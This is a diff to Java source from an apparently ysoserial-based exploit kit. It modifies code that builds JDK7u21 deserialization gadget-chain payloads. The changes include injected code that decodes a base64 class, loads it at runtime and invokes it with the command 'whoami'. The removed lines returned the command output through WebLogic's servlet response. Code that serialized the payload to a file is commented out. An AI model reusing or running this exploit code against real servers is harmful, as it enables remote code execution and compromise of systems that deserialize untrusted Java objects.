@@ -1,10 +1,8 @@
 package ysoserial.payloads.util;
 
 import java.io.ByteArrayOutputStream;
-import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
-import java.io.ObjectOutputStream;
 import java.io.Serializable;
 import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
@@ -15,8 +13,13 @@ import java.util.HashMap;
 import java.util.LinkedHashSet;
 
 import javax.xml.transform.Templates;
+//
+//import org.apache.xalan.xsltc.DOM;
+//import org.apache.xalan.xsltc.TransletException;
+//import org.apache.xalan.xsltc.runtime.AbstractTranslet;
+//import org.apache.xalan.xsltc.trax.TemplatesImpl;
+//import org.apache.xml.serializer.SerializationHandler;
 
-import org.apache.xalan.processor.TransformerFactoryImpl;
 import org.apache.xalan.xsltc.DOM;
 import org.apache.xalan.xsltc.TransletException;
 import org.apache.xalan.xsltc.runtime.AbstractTranslet;
@@ -33,7 +36,7 @@ import org.apache.xml.serializer.SerializationHandler;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
-import weblogic.apache.xml.dtm.DTMAxisIterator;
+import org.apache.xalan.xsltc.trax.TransformerFactoryImpl;
 
 class Reflections {
 
@@ -143,7 +146,7 @@ class Gadgets {
         pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
 
         // 获取已经编译好的类
-        System.out.println("ClassName: " + StubTransletPayload.class.getName());
+//        System.out.println("ClassName: " + StubTransletPayload.class.getName());
         final CtClass clazz = pool.get(StubTransletPayload.class.getName());
 
 //        // 在静态的的构造方法中插入payload
@@ -208,14 +211,14 @@ class Gadgets {
                         + "sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();"
                         + "byte[] bt = decoder.decodeBuffer(R);"
                         + "org.mozilla.classfile.DefiningClassLoader cls = new org.mozilla.classfile.DefiningClassLoader();"
-                        + "Class cl = cls.defineClass(\"ResultBaseExec\",bt);"
-                        + "java.lang.reflect.Method m = cl.getMethod(\"do_exec\",new Class[]{String.class});"
-                        + "Object object = m.invoke(cl.newInstance(),new Object[]{ua});"
-                        + "weblogic.servlet.internal.ServletResponseImpl response = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse();\n"
-                        + "weblogic.servlet.internal.ServletOutputStreamImpl outputStream = response.getServletOutputStream();\n"
-                        + "outputStream.writeStream(new weblogic.xml.util.StringInputStream(object.toString()));\n"
-                        + "outputStream.flush();\n"
-                        + "response.getWriter().write(\"\");"
+                        + "Class cl = cls.defineClass(\"ysoserial.payloads.util.UpJsp\",bt);"
+                        + "java.lang.reflect.Method m = cl.getMethod(\"say\",new Class[]{String.class});"
+                        + "Object object = m.invoke(cl.newInstance(),new Object[]{\"whoami\"});"
+//                        + "weblogic.servlet.internal.ServletResponseImpl response = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse();\n"
+//                        + "weblogic.servlet.internal.ServletOutputStreamImpl outputStream = response.getServletOutputStream();\n"
+//                        + "outputStream.writeStream(new weblogic.xml.util.StringInputStream(object.toString()));\n"
+//                        + "outputStream.flush();\n"
+//                        + "response.getWriter().write(\"\");"
                         + "");
 
 
@@ -280,12 +283,12 @@ public class JDK7u21_m {
 //    mvn install:install-file -Dfile=c:\kaptcha-{version}.jar -DgroupId=com.google.code
 //    		-DartifactId=kaptcha -Dversion={version} -Dpackaging=jar
     public static void main(String[] args) throws Exception {
-    	ysoserial.payloads.util.JDK7u21_m exploit = new ysoserial.payloads.util.JDK7u21_m();
-        Object payload = exploit.buildPayload("whoami");
-//        // test payload
-        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("./8848.bin"));
-        oos.writeObject(payload);
-        oos.close();
+//    	ysoserial.payloads.util.JDK7u21_m exploit = new ysoserial.payloads.util.JDK7u21_m();
+//        Object payload = exploit.buildPayload("whoami");
+////        // test payload
+//        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("./8848.bin"));
+//        oos.writeObject(payload);
+//        oos.close();
 //        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("./calc.bin"));
 //        ois.readObject();
 //
